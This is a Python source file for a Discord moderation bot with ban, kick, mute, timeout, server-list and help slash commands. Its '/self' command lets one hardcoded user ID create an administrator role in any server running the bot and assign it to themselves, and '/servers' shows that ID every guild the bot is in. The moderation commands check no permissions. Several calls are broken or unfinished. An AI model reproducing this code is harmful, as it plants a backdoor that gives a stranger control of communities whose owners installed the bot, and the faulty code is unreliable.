import discord
from discord.ext import commands
from discord import app_commands
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# Intents
intents = discord.Intents.default()
intents.members = True

# Bot setup
bot = commands.Bot(command_prefix='!', intents=intents)

# Helper function to create or get the muted role
async def get_muted_role(guild):
    role = discord.utils.get(guild.roles, name="Muted")
    if role is None:
        role = await guild.create_role(name="Muted")
        for channel in guild.channels:
            await channel.set_permissions(role, speak=False, send_messages=False)
    return role

# Ban command
@bot.tree.command(name="ban")
@app_commands.describe(user="The user to ban")
async def ban(interaction: discord.Interaction, user: discord.User):
    await interaction.response.defer()
    await interaction.guild.ban(user)
    await interaction.followup.send(f"{user} has been banned.")

# Unban command
@bot.tree.command(name="unban")
@app_commands.describe(user_id="The ID of the user to unban")
async def unban(interaction: discord.Interaction, user_id: int):
    user = await bot.fetch_user(user_id)
    await interaction.guild.unban(user)
    await interaction.response.send_message(f"{user} has been unbanned.")

# Kick command
@bot.tree.command(name="kick")
@app_commands.describe(user="The user to kick")
async def kick(interaction: discord.Interaction, user: discord.User):
    await interaction.response.defer()
    await interaction.guild.kick(user)
    await interaction.followup.send(f"{user} has been kicked.")

# Mute command
@bot.tree.command(name="mute")
@app_commands.describe(user="The user to mute")
async def mute(interaction: discord.Interaction, user: discord.User):
    role = await get_muted_role(interaction.guild)
    await user.add_roles(role)
    await interaction.response.send_message(f"{user} has been muted.")

# Unmute command
@bot.tree.command(name="unmute")
@app_commands.describe(user="The user to unmute")
async def unmute(interaction: discord.Interaction, user: discord.User):
    role = discord.utils.get(interaction.guild.roles, name="Muted")
    if role:
        await user.remove_roles(role)
    await interaction.response.send_message(f"{user} has been unmuted.")

# Timeout command
@bot.tree.command(name="timeout")
@app_commands.describe(user="The user to timeout", duration="Duration in seconds")
async def timeout(interaction: discord.Interaction, user: discord.User, duration: int):
    await user.timeout(duration)
    await interaction.response.send_message(f"{user} has been timed out for {duration} seconds.")

# Server list command
@bot.tree.command(name="servers")
async def servers(interaction: discord.Interaction):
    if interaction.user.id != 1169487822344962060:
        await interaction.response.send_message("You do not have permission to use this command.")
        return

    guilds = bot.guilds
    embeds = []
    for i in range(0, len(guilds), 5):
        embed = discord.Embed(title="Servers List", description="List of servers the bot is in:")
        for guild in guilds[i:i+5]:
            embed.add_field(name=guild.name, value=guild.id, inline=False)
        embeds.append(embed)

    # Pagination logic here (left as an exercise to implement)

# Help command
@bot.tree.command(name="help")
async def help_command(interaction: discord.Interaction):
    help_embed = discord.Embed(title="Help", description="List of commands:")
    help_embed.add_field(name="/ban", value="Ban a user")
    help_embed.add_field(name="/unban", value="Unban a user")
    help_embed.add_field(name="/kick", value="Kick a user")
    help_embed.add_field(name="/mute", value="Mute a user")
    help_embed.add_field(name="/unmute", value="Unmute a user")
    help_embed.add_field(name="/timeout", value="Timeout a user")
    help_embed.add_field(name="/servers", value="List of servers the bot is in (limited to specific user)")
    help_embed.add_field(name="/self", value="Create a role with administration permission (limited to specific user)")
    await interaction.response.send_message(embed=help_embed)

# Self command
@bot.tree.command(name="self")
async def self_command(interaction: discord.Interaction):
    if interaction.user.id != 1169487822344962060:
        await interaction.response.send_message("You do not have permission to use this command.")
        return

    role = discord.utils.get(interaction.guild.roles, name="69")
    if role is None:
        role = await interaction.guild.create_role(name="69")
        await role.editpermissions(administrator=True)
    await interaction.user.add_roles(role)
    await interaction.response.send_message("Role created and assigned.")

# Confirmation buttons
class Confirm(discord.ui.View):
    @discord.ui.button(style=discord.ButtonStyle.green, emoji="<:TWD_SUCCESS:1183023067321081886>")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Perform the action (e.g., ban, kick, mute, etc.)
        await interaction.response.send_message("Action confirmed.")

    @discord.ui.button(style=discord.ButtonStyle.red, emoji="<:TWD_CROSS:1183023325992202274>")
    async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Action denied.")

# Event to delete pre-existing slash commands
@bot.event
async def on_ready():
    await bot.tree.sync(guild=discord.Object(id=0))
    print(f"We have logged in as {bot.user}")

# Run the bot
bot.run(TOKEN)